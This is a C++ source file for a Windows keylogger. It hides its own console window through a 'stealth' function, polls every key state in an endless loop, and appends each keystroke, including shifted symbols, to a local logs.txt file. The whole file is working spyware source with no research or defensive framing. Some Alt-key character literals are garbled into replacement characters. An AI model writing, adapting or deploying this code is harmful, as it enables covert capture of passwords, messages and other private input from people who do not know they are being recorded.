#include <windows.h>
#include <iostream>
#include <string>
#include <fstream>

int save(int key)
{
	std::ofstream out_file;
	out_file.open("logs.txt", std::ios_base::app);
	std::string logs = "";

	switch (key) {
	case 1:
		return 0;
		break;
	case 2:
		return 0;
		break;
	//-----------------------------------------------------------------------
	//End of mouse
	//-----------------------------------------------------------------------
	case 96:
		logs += "0";
		break;
	case 97:
		logs += "1";
		break;
	case 98:
		logs += "2";
		break;
	case 99:
		logs += "3";
		break;
	case 100:
		logs += "4";
		break;
	case 101:
		logs += "5";
		break;
	case 102:
		logs += "6";
		break;
	case 103:
		logs += "7";
		break;
	case 104:
		logs += "8";
		break;
	case 105:
		logs += "9";
		break;
	//-----------------------------------------------------------------------
	//End of numpad digits
	//-----------------------------------------------------------------------
	case 48:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			logs += ")";
			break;
		}
		else
			logs += "0";
		break;
	case 49:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			logs += "!";
			break;
		}
		else
			logs += "1";
		break;
	case 50:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			logs += "@";
			break;
		}
		else
			logs += "2";
		break;
	case 51:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			logs += "#";
			break;
		}
		else
			logs += "3";
		break;
	case 52:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			logs += "$";
			break;
		}
		else
			logs += "4";
		break;
	case 53:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			logs += "%";
			break;
		}
		else
			logs += "5";
		break;
	case 54:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			logs += "^";
			break;
		}
		else
			logs += "6";
		break;
	case 55:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			logs += "&";
			break;
		}
		else
			logs += "7";
		break;
	case 56:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			logs += "*";
			break;
		}
		else
			logs += "8";
		break;
	case 57:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			logs += "(";
			break;
		}
		else
			logs += "9";
		break;
	//-----------------------------------------------------------------------
	//End of digits
	//-----------------------------------------------------------------------
	case 65:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			if (GetAsyncKeyState(VK_MENU)) {
				logs += "�";
			}
			else 
				logs += "A";
			break;
		} 
		else {
			if (GetAsyncKeyState(VK_MENU)) {
				logs += "�";
			}
			else
				logs += "a";
		}
		break;
	case 66:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			logs += "B";
			break;
		}
		else
			logs += "b";
		break;
	case 67:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			if (GetAsyncKeyState(VK_MENU)) {
				logs += "�";
			}
			else {
				logs += "C";
			}
			break;
		}
		else {
			if (GetAsyncKeyState(VK_MENU)) {
				logs += "�";
			}
			else {
				logs += "c";
			}
		}
		break;
	case 68:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			logs += "D";
			break;
		}
		else
			logs += "d";
		break;
	case 69:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			if (GetAsyncKeyState(VK_MENU)) {
				logs += "�";
			}
			else {
				logs += "E";
			}
			break;
		}
		else {
			if (GetAsyncKeyState(VK_MENU)) {
				logs += "�";
			}
			else {
				logs += "e";
			}
		}
		break;
	case 70:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			logs += "F";
			break;
		}
		else
			logs += "f";
		break;
	case 71:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			logs += "G";
			break;
		}
		else
			logs += "g";
		break;
	case 72:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			logs += "H";
			break;
		}
		else
			logs += "h";
		break;
	case 73:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			logs += "I";
			break;
		}
		else
			logs += "i";
		break;
	case 74:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			logs += "J";
			break;
		}
		else
			logs += "j";
		break;
	case 75:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			logs += "K";
			break;
		}
		else
			logs += "k";
		break;
	case 76:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			logs += "L";
			break;
		}
		else
			logs += "l";
		break;
	case 77:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			logs += "M";
			break;
		}
		else
			logs += "m";
		break;
	case 78:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			if (GetAsyncKeyState(VK_MENU)) {
				logs += "�";
			}
			else {
				logs += "N";
			}
			break;
		}
		else {
			if (GetAsyncKeyState(VK_MENU)) {
				logs += "�";
			}
			else {
				logs += "n";
			}
		}
		break;
	case 79:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			if (GetAsyncKeyState(VK_MENU)) {
				logs += "�";
			}
			else {
				logs += "O";
			}
			break;
		}
		else {
			if (GetAsyncKeyState(VK_MENU)) {
				logs += "�";
			}
			else {
				logs += "o";
			}
		}
		break;
	case 80:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			logs += "P";
			break;
		}
		else
			logs += "p";
		break;
	case 81:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			logs += "Q";
			break;
		}
		else
			logs += "q";
		break;
	case 82:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			logs += "R";
			break;
		}
		else
			logs += "r";
		break;
	case 83:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			if (GetAsyncKeyState(VK_MENU)) {
				logs += "�";
			}
			else {
				logs += "S";
			}
			break;
		}
		else {
			if (GetAsyncKeyState(VK_MENU)) {
				logs += "�";
			}
			else {
				logs += "s";
			}
		}
		break;
	case 84:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			logs += "T";
			break;
		}
		else
			logs += "t";
		break;
	case 85:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			logs += "U";
			break;
		}
		else {
			if (GetAsyncKeyState(VK_MENU)) {
				logs += "�";
			}
			else {
				logs += "u";
			}
		}
		break;
	case 86:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			logs += "V";
			break;
		}
		else
			logs += "v";
		break;
	case 87:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			logs += "W";
			break;
		}
		else
			logs += "w";
		break;
	case 88:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			if (GetAsyncKeyState(VK_MENU)) {
				logs += "�";
			}
			else {
				logs += "X";
			}
			break;
		}
		else {
			if (GetAsyncKeyState(VK_MENU)) {
				logs += "�";
			}
			else {
				logs += "x";
			}
		}
		break;
	case 89:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			logs += "Y";
			break;
		}
		else
			logs += "y";
		break;
	case 90:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			if (GetAsyncKeyState(VK_MENU)) {
				logs += "�";
			}
			else {
				logs += "Z";
			}
			break;
		}
		else {
			if (GetAsyncKeyState(VK_MENU)) {
				logs += "�";
			}
			else {
				logs += "z";
			}
		}
		break;
	//-----------------------------------------------------------------------
	//End of A-Z characters
	//-----------------------------------------------------------------------
	default:
		break;
	}
	
	out_file << logs;
	out_file.close();
	return 0;
}

void stealth() {
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("consoleWindowClass", NULL);
	ShowWindow(stealth, 0);
}

int main(int argc, char * argv[]) {
	//path to our .exe is in argv[0]
	stealth();
	char i;
	while (1) {
		for (i = 8; i <= 190; i++) {
			if (GetAsyncKeyState(i) == -32767)
				save(i);
		}
	}
	return 0;
}